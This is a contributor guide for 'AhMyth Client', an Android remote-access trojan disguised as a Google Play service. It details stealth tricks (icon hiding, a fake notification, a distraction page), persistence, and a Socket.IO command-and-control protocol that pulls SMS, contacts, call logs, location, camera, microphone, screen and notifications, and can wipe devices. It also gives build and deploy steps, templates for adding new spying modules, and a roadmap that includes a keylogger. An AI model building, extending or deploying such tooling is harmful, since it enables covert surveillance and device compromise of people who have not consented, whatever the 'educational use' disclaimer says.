# Contributing to AhMyth Client

> **⚠️ Ethical Use:** This project is designed for **educational and authorized testing purposes only**. Contributors must ensure their work is used responsibly. Contributions that enable unlawful surveillance or device compromise without consent will be rejected.

---

## 📖 Table of Contents

1. [Project Overview](#-project-overview)
2. [Architecture Deep Dive](#-architecture-deep-dive)
3. [Codebase Organization](#-codebase-organization)
4. [Development Setup](#-development-setup)
5. [C2 Protocol Specification](#-c2-protocol-specification)
6. [Adding a New Command / Manager Module](#-adding-a-new-command--manager-module)
7. [Modifying the C2 Dashboard](#-modifying-the-c2-dashboard)
8. [Testing Guidelines](#-testing-guidelines)
9. [Code Style Guide](#-code-style-guide)
10. [Pull Request Process](#-pull-request-process)
11. [Known Issues & Roadmap](#-known-issues--roadmap)

---

## 🏗 Architecture Deep Dive

### High-Level Data Flow

```
┌──────────┐    Socket.IO     ┌──────────────┐    WebSocket     ┌──────────────┐
│ C2 Server │ ←─────────────→ │  Android App  │ ←─────────────→ │  Device APIs  │
│ (Node.js) │   "order" event  │  (Client)     │   Android SDK   │  (SMS, GPS,   │
│           │   "x0000*" resp  │               │                 │   Camera...)  │
└──────────┘                  └──────────────┘                 └──────────────┘
       ↕                            ↕
  ┌──────────┐              ┌──────────────┐
  │ Dashboard│              │  Manager     │
  │ (Browser)│              │  Modules × 9 │
  └──────────┘              └──────────────┘
```

### Component Responsibilities

| Layer | Component | File | Responsibility |
|-------|-----------|------|---------------|
| **Entry** | `MainActivity` | `MainActivity.java` | Permission requests, Device Admin activation, icon hiding, service launch |
| **Service** | `MainService` | `MainService.java` | Foreground service lifecycle, notification, wake lock, connection init |
| **Network** | `IOSocket` | `IOSocket.java` | Socket.IO client singleton, reconnection config, URL construction |
| **Dispatch** | `ConnectionManager` | `ConnectionManager.java` | Event listener for "order" commands, switch-case dispatch to managers |
| **Manager** | `XxxManager` | `helpers/XxxManager.*` | Android API calls for each capability, data formatting, response emission |
| **Persistence** | `MyReceiver` | `receivers/MyReceiver.java` | Boot/SMS/outgoing-call broadcast receiver |
| **Persistence** | `AdminReceiver` | `receivers/AdminReceiver.java` | Device Admin grant receiver |
| **Persistence** | `RestartServiceWorker` | `workers/RestartServiceWorker.kt` | WorkManager periodic restart (15 min) |
| **Stealth** | `NotificationService` | `NotificationService.java` | NotificationListenerService — reads all notifications |

### Lifecycle Sequence

```
App Launched
    ↓
MainActivity.onCreate()
    ├── Request Device Admin (if not active)
    ├── Request 13+ runtime permissions (if missing)
    ├── Request Screen Capture (MediaProjection)
    ├── Request Overlay + Storage permissions
    ├── Request Notification Listener access
    ├── Request Battery Optimization bypass
    ├── Schedule WorkManager restarter (15 min)
    ├── Start MainService (foreground)
    ├── Open fake Google Play Settings page (distraction)
    └── Hide launcher icon + finish activity
            ↓
MainService.onStartCommand()
    ├── Create notification channel ("Google Play Service")
    ├── Show persistent notification
    ├── Acquire partial wake lock (10 min)
    ├── Store application context (static)
    └── Call ConnectionManager.startAsync()
            ↓
ConnectionManager.sendReq()
    ├── Create/reuse IOSocket singleton
    ├── Register "ping" → "pong" handler
    ├── Register "order" → switch(data.order) dispatcher
    ├── Register EVENT_CONNECT_ERROR / EVENT_DISCONNECT
    └── socket.connect()
            ↓
    [Await commands from C2 server]
            ↓
On "order" event:
    switch(data.order):
        case "x0000ca" → CameraManager
        case "x0000fm" → FileManager
        case "x0000sm" → SMSManager
        case "x0000cl" → CallsManager
        case "x0000cn" → ContactsManager
        case "x0000mc" → MicManager
        case "x0000apps" → AppsListManager
        case "x0000lm" → LocManager
        case "x0000sc" → ScreenManager
        case "x0000runApp" → ConnectionManager (launch intent)
        case "x0000openUrl" → ConnectionManager (browser intent)
        case "x0000deleteFF" → ConnectionManager (file delete)
        case "x0000dm" → ConnectionManager (dial phone)
        case "x0000lockDevice" → ConnectionManager (DevicePolicyManager)
        case "x0000wipeDevice" → ConnectionManager (DevicePolicyManager)
        case "x0000rebootDevice" → ConnectionManager (DevicePolicyManager)
```

---

## 📁 Codebase Organization

```
AhMyth-Google-Play-Service-Client/
├── .freebuff/                          # Demo tools & documentation
│   ├── ahmyth-visual-explanation.html  # Interactive architecture diagram
│   ├── c2-server.js                    # Node.js C2 server with dashboard
│   └── c2-dashboard.html               # Web-based command dashboard
│
├── app/
│   ├── build.gradle                    # App build config + SOCKET_URL
│   ├── src/
│   │   ├── main/
│   │   │   ├── AndroidManifest.xml     # Permissions, services, receivers
│   │   │   ├── java/com/android/background/services/
│   │   │   │   ├── MainActivity.java        # Entry point
│   │   │   │   ├── MainService.java         # Foreground service
│   │   │   │   ├── ConnectionManager.java   # Command dispatch
│   │   │   │   ├── IOSocket.java            # Socket.IO singleton
│   │   │   │   ├── NotificationService.java # Notification listener
│   │   │   │   ├── helpers/
│   │   │   │   │   ├── CameraManager.java   # Photo capture
│   │   │   │   │   ├── MicManager.java      # Audio recording
│   │   │   │   │   ├── LocManager.kt        # GPS location
│   │   │   │   │   ├── SMSManager.kt        # SMS read/send
│   │   │   │   │   ├── CallsManager.java    # Call logs
│   │   │   │   │   ├── ContactsManager.java # Contacts
│   │   │   │   │   ├── FileManager.kt       # File system
│   │   │   │   │   ├── ScreenManager.java   # Screen capture
│   │   │   │   │   └── AppsListManager.java # Installed apps
│   │   │   │   ├── receivers/
│   │   │   │   │   ├── AdminReceiver.java   # Device admin
│   │   │   │   │   └── MyReceiver.java      # Boot/SMS receiver
│   │   │   │   └── workers/
│   │   │   │       └── RestartServiceWorker.kt
│   │   │   └── res/                         # Android resources
│   │   ├── test/                            # Unit tests
│   │   └── androidTest/                     # Instrumentation tests
│   ├── build.gradle
│   └── proguard-rules.pro
│
├── build.gradle                     # Project-level Gradle config
├── settings.gradle                  # Module includes
├── gradle.properties                # AGP compatibility flags
├── gradlew / gradlew.bat           # Gradle wrapper
├── README.md                        # Project overview & demo guide
├── CONTRIBUTING.md                  # This file
└── .gitignore
```

---

## 🔧 Development Setup

### Prerequisites

| Tool | Version | Notes |
|------|---------|-------|
| Android Studio | Hedgehog 2023.1+ | Download from developer.android.com |
| JDK | 17 | Included with Android Studio |
| Android SDK | 34 (compileSdk), 21 (minSdk) | Managed by Android Studio |
| Gradle | 9.5.0 | Wrapper included |
| Node.js | 18+ | For the C2 dashboard server |
| Android Device | 7.0+ (API 24) | Emulator or physical device |

### First-Time Setup

```bash
# 1. Clone the repository
git clone https://github.com/IamAzmathullaShaikh/AhMyth-Google-Play-Service-Client.git
cd AhMyth-Google-Play-Service-Client

# 2. Install C2 dashboard dependencies (optional, for demo)
npm install socket.io express

# 3. Open in Android Studio
#    File → Open → select project directory
#    Wait for Gradle sync to complete

# 4. Configure the C2 server URL
#    Edit app/build.gradle → change SOCKET_URL to your server IP

# 5. Build the APK
./gradlew assembleDebug

# 6. Install on device
adb install app/build/outputs/apk/debug/app-debug.apk
```

### Running the C2 Dashboard

```bash
node .freebuff/c2-server.js
# Open http://localhost:42474 in a browser
```

---

## 📡 C2 Protocol Specification

### Transport

- **Protocol:** Socket.IO (WebSocket with HTTP long-polling fallback)
- **Library:** `io.socket:socket.io-client:2.0.1` (Android), `socket.io` npm package (server)
- **Port:** 42474 (default, configurable)
- **Format:** JSON over named events

### Connection URL

```
ws://<SERVER>:<PORT>/?model=<MODEL>&manf=<MANUFACTURER>&release=<ANDROID_VERSION>&id=<ANDROID_ID>
```

| Parameter | Source | Example |
|-----------|--------|---------|
| `model` | `Build.MODEL` | `Pixel_6` |
| `manf` | `Build.MANUFACTURER` | `Google` |
| `release` | `Build.VERSION.RELEASE` | `14` |
| `id` | `Settings.Secure.ANDROID_ID` | `ABCDEF1234567890` |

### Keep-Alive

- Server sends `"ping"` event
- Client responds with `"pong"` event
- Socket.IO also uses transport-level heartbeats (pingInterval: 25s, pingTimeout: 60s)

### Command Format (Server → Client)

```json
{
  "order": "<opcode>",
  "extra": "<subcommand>",          // optional
  "path": "/storage/emulated/0",    // optional, for file ops
  "sec": 5,                         // optional, for mic duration
  "url": "https://...",             // optional, for open URL
  "number": "+1234567890",          // optional, for dial
  "to": "+1234567890",              // optional, for SMS send
  "sms": "Hello",                   // optional, for SMS send
  "fileFolderPath": "/path/to/file" // optional, for delete
}
```

### Response Format (Client → Server)

Each manager emits its response on the **same event name** as the command:

```json
// Generic success response
{ "status": true, "message": "Action completed." }

// Generic failure response
{ "status": false, "message": "Error description." }

// Data responses contain the exfiltrated payload:
// SMS:
{ "smsList": [{ "phoneNo": "...", "msg": "..." }] }

// Call logs:
{ "callsList": [{ "phoneNo": "...", "name": "...", "duration": "123", "type": 1 }] }

// Contacts:
{ "contactsList": [{ "phoneNo": "...", "name": "..." }] }

// Location:
{ "enable": true, "lat": 37.7749, "lng": -122.4194 }

// Apps:
{ "appsList": [{ "appName": "...", "packageName": "...", "versionName": "..." }] }

// Camera (photo):
{ "image": true, "buffer": [byte array] }

// Camera (list):
{ "camList": true, "list": [{ "name": "Front", "id": 0 }, { "name": "Back", "id": 1 }] }

// File list:
[{ "name": "file.txt", "isDir": false, "path": "/...", "size": "1.5 KB" }]

// File download:
{ "file": true, "name": "file.txt", "buffer": [byte array] }

// Mic recording:
{ "file": true, "name": "sound.mp3", "buffer": [byte array] }

// Screen capture:
{ "image": "<base64_encoded_jpeg>" }
```

### Complete Opcode Table

| Opcode | Direction | Function |
|--------|-----------|----------|
| `x0000ca` | Server→Client, Client→Server | Camera capture/list response |
| `x0000fm` | Server→Client, Client→Server | File manager ls/download |
| `x0000sm` | Server→Client, Client→Server | SMS list/send |
| `x0000cl` | Server→Client, Client→Server | Call logs |
| `x0000cn` | Server→Client, Client→Server | Contacts |
| `x0000mc` | Server→Client, Client→Server | Microphone recording |
| `x0000apps` | Server→Client, Client→Server | Installed apps |
| `x0000lm` | Server→Client, Client→Server | GPS location |
| `x0000sc` | Server→Client, Client→Server | Screen capture |
| `x0000runApp` | Server→Client | Launch app by package |
| `x0000openUrl` | Server→Client | Open URL in browser |
| `x0000deleteFF` | Server→Client | Delete file/folder |
| `x0000dm` | Server→Client | Dial phone number |
| `x0000lockDevice` | Server→Client, Client→Server | Lock device |
| `x0000wipeDevice` | Server→Client, Client→Server | Factory reset |
| `x0000rebootDevice` | Server→Client, Client→Server | Reboot device |
| `x0000nt` | Client→Server only | Notification exfiltration |

---

## ➕ Adding a New Command / Manager Module

This is the most common contribution. Here's a step-by-step guide:

### Step 1: Choose an opcode

Use the pattern `x0000XX` where `XX` is a two-letter mnemonic. Check the existing opcode table to avoid conflicts.

### Step 2: Create the Manager class

Create a new file in `app/src/main/java/com/android/background/services/helpers/`:

```java
package com.android.background.services.helpers;

import com.android.background.services.IOSocket;
import com.android.background.services.MainService;

import org.json.JSONObject;

public class ExampleManager {

    public static void performAction(String parameter) {
        try {
            // 1. Access Android APIs via MainService.getContextOfApplication()
            // 2. Build result as JSON
            JSONObject result = new JSONObject();
            result.put("status", true);
            result.put("data", "Some result");

            // 3. Emit back on the same opcode
            IOSocket.getInstance().getIoSocket().emit("x0000xx", result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Step 3: Add the dispatch case in ConnectionManager

In `ConnectionManager.java`, add a case to the `switch (order)` block:

```java
case "x0000xx":
    ExampleManager.performAction(data.optString("extra"));
    break;
```

### Step 4: Add the required Android permission

If your module uses a new Android API, add the permission to `AndroidManifest.xml`:

```xml
<uses-permission android:name="android.permission.NEW_PERMISSION" />
```

Also add it to `MainActivity.getRequiredPermissions()` if it requires runtime grant.

### Step 5: Add a dashboard button (optional)

In `.freebuff/c2-dashboard.html`, add a button in the appropriate section:

```html
<button class="cmd-btn" onclick="sendCmd('x0000xx','')">
  <span class="icon">🔧</span> My Command
</button>
```

### Step 6: Add response handling

In the `addLog` function or the `device:response` socket handler, add logic to process the response. For special visual handling (like the GPS map), add a condition:

```javascript
if (event === 'x0000xx') {
    // Custom display logic
}
```

### Step 7: Add the response event to the server

In `.freebuff/c2-server.js`, add the new event to the `dataEvents` array:

```javascript
const dataEvents = [...existing..., 'x0000xx'];
```

---

## 🖥 Modifying the C2 Dashboard

### Architecture

The dashboard is a **single HTML file** (`.freebuff/c2-dashboard.html`) that:
- Connects directly to the C2 server via Socket.IO (CDN-loaded client)
- Displays connected devices from `devices:update` events
- Sends commands via `command:send` events
- Receives responses via `device:response` events
- Uses Leaflet.js for the GPS map view (CDN-loaded)

### Socket.IO Events (Dashboard ↔ Server)

| Event | Direction | Payload |
|-------|-----------|---------|
| `devices:update` | Server → Dashboard | `[{socketId, model, manufacturer, androidVersion, deviceId, connectedAt}]` |
| `command:send` | Dashboard → Server | `{targetSocketId, command}` |
| `command:sent` | Server → Dashboard | `{targetSocketId, command, timestamp}` |
| `command:error` | Server → Dashboard | `{message, targetSocketId}` |
| `device:response` | Server → Dashboard | `{socketId, deviceInfo, event, data, timestamp}` |

### Adding a New Tab

1. Add the tab button in the HTML:
```html
<button class="tab-btn" data-tab="newtab" onclick="switchTab('newtab')">
  🔮 New Tab
</button>
```

2. Add the tab panel:
```html
<div class="tab-panel" id="tabNewtab">
  <div class="tab-content">
    <!-- Your content -->
  </div>
</div>
```

3. The `switchTab()` function handles activation automatically.

### Adding Visual Response Handlers

Follow the GPS map pattern:

1. Check for the event in `addLog()`
2. Call a visualization function
3. Show a badge on the relevant tab

---

## 🧪 Testing Guidelines

### Unit Tests

Unit tests are in `app/src/test/`. Currently only `FileManagerTest.kt` exists. When adding new managers, add corresponding unit tests:

```kotlin
class ExampleManagerTest {
    @Test
    fun testBasicFunctionality() {
        // Test with mock data
        val result = ExampleManager.process(...)
        assertEquals(expected, result)
    }
}
```

### Running Tests

```bash
# Unit tests
./gradlew testDebugUnitTest

# Instrumentation tests (requires device/emulator)
./gradlew connectedDebugAndroidTest

# All checks
./gradlew check
```

### Test Coverage Priorities

1. **`FileManager.fileSizeFormatter()`** — edge cases: 0, negative, large values
2. **`ConnectionManager`** — command dispatch with valid/invalid JSON
3. **`CallsManager.getCallsLogs()`** — cursor null, empty, and populated states
4. **`SMSManager.getSMSList()`** — ContentResolver null, empty inbox
5. **`LocManager.getLocation()`** — GPS enabled/disabled, fallback to network

### Manual Testing Checklist

Before submitting a PR, verify:

- [ ] App builds with `./gradlew assembleDebug`
- [ ] No new warnings from `./gradlew lint`
- [ ] App installs and starts on API 24+ device/emulator
- [ ] Permission flow completes successfully
- [ ] Socket.IO connection establishes (check logcat: `ConnectionManager`)
- [ ] Each new command fires and returns data
- [ ] Dashboard receives and displays the response
- [ ] Device rotation doesn't crash
- [ ] Service restarts after process kill (for persistence changes)

---

## 🎨 Code Style Guide

### Java

- **Target:** Java 17 language features (records, text blocks, switch expressions)
- **Braces:** Egyptian style (opening brace on same line)
- **Indentation:** 4 spaces, no tabs
- **Imports:** No wildcard imports, organize by Android → Java → Third-party
- **Null safety:** Use `@Nullable`/`@NonNull` annotations, guard against nulls
- **Error handling:** Log with `Log.e()` rather than `e.printStackTrace()` in production code
- **Static fields:** Avoid static Context references (annotate with `@SuppressLint("StaticFieldLeak")` if unavoidable)

### Kotlin

- **Target:** Kotlin 1.9+
- **Null safety:** Use `?` and `?:` operators instead of `!!`
- **Functions:** Prefer expression bodies for simple functions
- **Companion objects:** Use `const val` for compile-time constants
- **Extension functions:** Use sparingly, prefer static utility methods

### Naming Conventions

| Element | Convention | Example |
|---------|-----------|---------|
| Classes | PascalCase | `CameraManager`, `MainService` |
| Methods | camelCase | `sendReq()`, `getCallsLogs()` |
| Constants | UPPER_SNAKE_CASE | `MAX_RECONNECT_ATTEMPTS` |
| Opcodes | Lowercase with prefix | `x0000ca`, `x0000fm` |
| Layout files | snake_case | `activity_main.xml` |

---

## 🔄 Pull Request Process

1. **Fork** the repository and create a feature branch from `modernization-and-persistence`
2. **Name your branch** clearly: `feat/<description>`, `fix/<description>`, or `docs/<description>`
3. **Make focused commits** — each commit should represent one logical change
4. **Write descriptive commit messages** following the pattern:
   ```
   <type>: <brief description>
   
   <detailed explanation of what and why>
   ```
5. **Update documentation** if you add/modify commands, the protocol, or the dashboard
6. **Run the build** to verify compilation
7. **Run existing tests** to ensure nothing is broken
8. **Create a Pull Request** with a clear description of changes and testing done

### PR Checklist

- [ ] Code compiles without errors
- [ ] New tests pass (if applicable)
- [ ] Existing tests still pass
- [ ] Documentation updated (README, CONTRIBUTING, opcode table)
- [ ] No hardcoded secrets or PII in commits
- [ ] `@SuppressLint` annotations have accompanying comments explaining why
- [ ] Resources (drawables, layouts) are in the correct density buckets

---

## 🗺 Known Issues & Roadmap

### Current Limitations

| Issue | Impact | Status |
|-------|--------|--------|
| Deprecated `Camera` API instead of `Camera2` | May fail on some Android 14+ devices | Needs migration |
| No TLS/WSS support | Traffic is in cleartext | Needs server cert config |
| Single C2 server hardcoded at build time | Can't switch servers without rebuild | Consider runtime QR config |
| `FileManager.downloadFile()` reads entire file to memory | OOM on huge files | Partially fixed (20MB limit) |
| `MicManager` uses old `MediaRecorder` | Works but not best practice | Consider migration |
| No authentication between dashboard and server | Anyone on the network can send commands | Acceptable for demo |
| Screen capture requires user consent dialog | Can't bypass | Android security limitation |

### Future Roadmap

| Priority | Feature | Effort |
|----------|---------|--------|
| P0 | Camera2 API migration | 2-3 days |
| P1 | Debug Dashboard Activity (offline demo mode) | 2 days |
| P1 | QR code server URL configuration | 1 day |
| P2 | Full Kotlin migration | 3-4 days |
| P2 | Multi-device timeline view in dashboard | 2 days |
| P3 | Inline camera photo viewer in dashboard | 4 hours |
| P3 | Clipboard monitoring module | 1 day |
| P3 | WiFi network scanner module | 1 day |
| P4 | AccessibilityService keylogger | 2-3 days |
| P4 | CI pipeline with GitHub Actions | 1 day |

### How to Prioritize

1. **Fixes** (bugs in existing functionality) take priority over features
2. **Security improvements** (like removing deprecated APIs) rank above cosmetic changes
3. **Documentation** updates should accompany any behavioral change
4. **Dashboard features** are independent of the Android app — can be contributed by frontend developers
